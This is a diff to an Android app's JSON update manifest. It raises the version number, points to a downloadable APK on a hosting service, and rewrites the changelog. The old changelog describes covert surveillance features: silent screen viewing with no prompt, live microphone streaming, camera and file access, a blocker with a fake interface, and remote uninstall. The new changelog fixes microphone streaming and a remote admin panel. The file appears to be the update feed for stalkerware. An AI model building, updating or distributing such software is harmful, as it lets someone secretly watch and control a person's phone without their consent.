@@ -1,8 +1,8 @@
 {
-  "version_code": 47,
-  "version_name": "7.9.2",
+  "version_code": 48,
+  "version_name": "7.9.3",
   "apk_url": "https://netmirrorr.onrender.com/downloadapp/fullupdate.apk",
-  "changelog": "FIXED: Live screen viewer (silent, no prompt), live mic player (Web Audio API real-time), camera gallery, file manager (offline cache), apps list (shows ALL user apps via <queries>), app blocker v2 (fake UI: update page/contact/call/timer/redirect), remote uninstall, blocked apps unblock list.",
+  "changelog": "FIXED: Mic audio stuttering (PCM 16kHz + jitter buffer + AudioContext.resume). FIXED: Admin panel stuck on Connecting (auth timeout + premature Connected state).",
   "is_mandatory": false,
   "poster_url": "",
   "minSdk": 26,
